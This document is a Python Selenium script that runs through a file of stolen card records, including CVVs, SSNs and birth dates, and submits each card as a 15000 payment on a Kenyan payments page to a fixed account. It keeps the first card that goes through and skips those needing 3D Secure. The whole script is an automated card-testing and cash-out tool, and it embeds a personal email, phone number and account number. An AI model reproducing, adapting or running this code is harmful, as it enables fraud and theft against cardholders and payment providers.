from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from time import sleep
from utilities import readlines
from form_filler import *

with open("line_tracker.txt", "r+") as line_tracker_file_handle:
    line_tracker = int(line_tracker_file_handle.read())
    with open("dump.csv", encoding="utf-8") as dump:
        while True:
            lines = readlines(dump, 10)
            if not lines:
                break
            for line in lines:

                # Create a new Service instance
                service = Service("./drivers/chromedriver")

                # Create a new instance of the Chrome driver
                driver = webdriver.Chrome(service=service)

                # Maximize the window
                driver.maximize_window()

                # Read the card details from the file
                cc_details = line.split("|")

                cc_number = cc_details[0]
                cc_expiry = cc_details[1]
                cc_cvv = cc_details[2]
                cc_name = cc_details[3]
                cc_bank = cc_details[4]
                cc_type = cc_details[5]
                cc_status = cc_details[6]
                cc_class = cc_details[7]
                cc_address = cc_details[8]
                cc_state = cc_details[9]
                cc_city = cc_details[10]
                cc_zip = cc_details[11]
                cc_country = cc_details[12]
                cc_dob = cc_details[13]
                cc_ssn = cc_details[14]
                cc_email = cc_details[15]
                cc_phone = cc_details[16]

                # Navigate to the faiba payments page
                driver.get("https://payments.faiba.co.ke/")

                # Find and fill all the elements in the faiba page
                find_and_fill_names(
                    driver, cc_name, "reg_item49", "reg_item50")
                find_and_fill_email(
                    driver, "tonykamau1996@gmail.com", "reg_item51")
                find_and_fill_phone(driver, "0795204551", "reg_item52")
                find_and_fill_accountnumber(driver, "0747044108", "reg_item53")
                find_and_fill_amount(driver, "15000", "reg_item54")

                # Fill the form with the required data and submit
                find_and_click_continue(driver, "continueBtn")

                # Wait for the #faiba-content element to be present
                faiba_content = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "faiba-content"))
                )

                # Switch to the iframe
                driver.switch_to.frame(0)

                # Wait for the debit_card element to be clickable
                debit_card = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.ID, "pcards"))
                )

                # Click the debit card option
                while True:
                    try:
                        debit_card.click()
                        break
                    except:
                        sleep(0.5)
                        continue

                # Find and fill all the elements in the pesapal iframe
                # There's no need to fill the name field since it's already filled
                find_and_fill_email(driver, cc_email, "emailaddress")
                if find_and_select_country(driver, cc_country, "CountryCodeId"):
                    find_and_fill_phone(driver, cc_phone, "cphonenumber")
                else:
                    find_and_fill_phone(driver, "795204551", "cphonenumber")
                find_and_fill_address(driver, cc_address, "line1")
                find_and_fill_city(driver, cc_city, "cityname")
                find_and_fill_zipcode(driver, cc_zip, "postalcode")
                find_and_fill_state(driver, cc_country, cc_state, "statecode")

                find_and_fill_cardnumber(driver, cc_number, "CardNumber")
                find_and_fill_cardexpiry(
                    driver, cc_expiry, "expiryMonth", "expiryYear")
                find_and_fill_cvv(driver, cc_cvv, "cvv")
                find_and_click_acceptterms(driver, "acceptterms")

                # Fill the form with the required data and submit
                find_and_click_paynow(driver, "submitFormBtn")

                # Wait for the .confirmationbtn element to be clickable
                try:
                    confirmationbtn = WebDriverWait(driver, 60).until(
                        EC.element_to_be_clickable(
                            (By.CLASS_NAME, "confirmationbtn"))
                    )

                    # Extract the text from the .confirmationbtn element
                    confirmationbtn_text = confirmationbtn.text.lower()
                    if confirmationbtn_text != "try again":
                        # Save the card details to a file
                        with open("card_details.txt", "w") as f:
                            f.write("Card Number: " + cc_number)
                            f.write("Card Expiry: " + cc_expiry)
                            f.write("Card CVV: " + cc_cvv)

                        driver.close()
                        exit()
                except TimeoutException:
                    # Possibly the card requires a 3D secure, so we move onto the next card
                    pass

                # Close the browser
                driver.close()

                line_tracker += 1

                # Update the line tracker
                line_tracker_file_handle.seek(0)
                line_tracker_file_handle.write(str(line_tracker))
